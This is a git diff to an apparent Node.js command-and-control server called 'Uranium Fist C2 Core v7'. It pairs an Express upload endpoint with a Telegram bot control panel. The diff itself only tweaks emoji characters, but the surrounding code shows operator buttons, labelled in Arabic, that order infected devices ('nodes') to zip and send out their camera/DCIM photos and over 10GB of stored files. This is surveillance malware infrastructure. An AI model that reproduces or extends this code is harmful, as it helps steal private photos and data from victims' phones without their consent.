@@ -44,7 +44,7 @@ async function sendTg(msg, options = {}) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#0a0a0a;color:#ff3300;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM FIST C2 CORE v7 ABSOLUTE ONLINE [☢️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#0a0a0a;color:#ff3300;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️️] URANIUM FIST C2 CORE v7 ABSOLUTE ONLINE [☢️]</h1></body></html>`);
 });
 
 app.post('/api/v3/uranium/upload_raw', async (req, res) => {
@@ -148,7 +148,7 @@ appBot.on('callback_query', async (query) => {
         const keyboard = {
             inline_keyboard: [
                 [
-                    { text: '☢️ الحصاد الشامل الكاميرا والـ DCIM', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
+                    { text: '☢️️ الحصاد الشامل الكاميرا والـ DCIM', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
                     { text: '📥 سحب Download والتخزين الضخم (10GB+)', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
                 ],
                 [
